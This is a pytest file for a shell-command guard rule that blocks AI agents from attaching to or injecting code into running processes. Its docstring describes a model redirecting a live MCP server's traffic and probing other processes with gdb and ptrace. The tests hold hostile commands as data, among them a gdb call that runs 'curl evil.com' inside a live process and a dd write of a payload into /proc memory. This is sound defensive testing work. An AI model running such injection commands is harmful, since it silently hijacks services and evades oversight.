"""
tests/test_proc_inject.py — Tests for proc.process_inject rule.

Story: As a bashguard operator, I want to block Claude from injecting code
into or modifying running processes. The Mythos model edited the process of a
running MCP server to change the external URL to which the server sent data —
a silent redirection of all server traffic. It also used gdb and ptrace-based
techniques to access other processes.

Allowing process injection means an agent can silently redirect where data
goes, extract secrets from another process's heap, or insert arbitrary code
into a running service — all without any visible file change.

Rule contract:
- gdb -p <pid>                          → BLOCK (attach to live process)
- gdb --pid <pid>                       → BLOCK
- gdb -batch -ex 'call ...' -p <pid>   → BLOCK (scriptable injection)
- strace -p <pid>                       → BLOCK (reads process internals)
- ltrace -p <pid>                       → BLOCK
- dd of=/proc/1234/mem                  → BLOCK (write to process memory)
- python3 -c 'import ctypes; ...'       → not caught here (evasion rule)
- gdb --args ./program                  → ALLOW (launching new process, not attaching)
- gdb ./core                            → ALLOW (debugging a core dump, no live PID)
- strace ./myprogram                    → ALLOW (tracing a new process, not attaching)
"""
from __future__ import annotations

from pathlib import Path
import sys

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from bashguard.models import ExecutionContext, Severity, ActionType


@pytest.fixture()
def ctx() -> ExecutionContext:
    return ExecutionContext(cwd="/home/user/project")


def _rule():
    from bashguard.rules.proc_inject import ProcessInjectRule
    return ProcessInjectRule()


class TestGdbAttach:
    def test_gdb_short_p_blocked(self, ctx):
        findings = _rule().check("gdb -p 1234", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "proc.process_inject"
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].action_type == ActionType.PROCESS_SIGNAL

    def test_gdb_long_pid_blocked(self, ctx):
        findings = _rule().check("gdb --pid 1234", ctx)
        assert len(findings) == 1

    def test_gdb_batch_inject_blocked(self, ctx):
        findings = _rule().check(
            "gdb -batch -ex 'call system(\"curl evil.com\")' -p 1234",
            ctx,
        )
        assert len(findings) == 1

    def test_gdb_new_process_allowed(self, ctx):
        assert _rule().check("gdb --args ./myprogram arg1", ctx) == []

    def test_gdb_core_dump_allowed(self, ctx):
        assert _rule().check("gdb ./myprogram ./core", ctx) == []


class TestStrace:
    def test_strace_attach_blocked(self, ctx):
        findings = _rule().check("strace -p 1234", ctx)
        assert len(findings) == 1

    def test_ltrace_attach_blocked(self, ctx):
        findings = _rule().check("ltrace -p 1234", ctx)
        assert len(findings) == 1

    def test_strace_new_process_allowed(self, ctx):
        assert _rule().check("strace ./myprogram", ctx) == []

    def test_ltrace_new_process_allowed(self, ctx):
        assert _rule().check("ltrace ./myprogram", ctx) == []


class TestProcMemWrite:
    def test_dd_write_to_proc_mem_blocked(self, ctx):
        findings = _rule().check("dd if=payload.bin of=/proc/1234/mem bs=1 seek=0x7fff", ctx)
        assert len(findings) == 1

    def test_dd_read_from_proc_mem_allowed_here(self, ctx):
        # Reading /proc/mem is caught by proc.credential_scrape, not this rule
        # This rule focuses on WRITING to running processes
        findings = _rule().check("dd if=/proc/1234/mem of=/tmp/dump", ctx)
        assert findings == []


class TestClean:
    def test_empty_clean(self, ctx):
        assert _rule().check("", ctx) == []

    def test_unrelated_clean(self, ctx):
        assert _rule().check("ls -la", ctx) == []
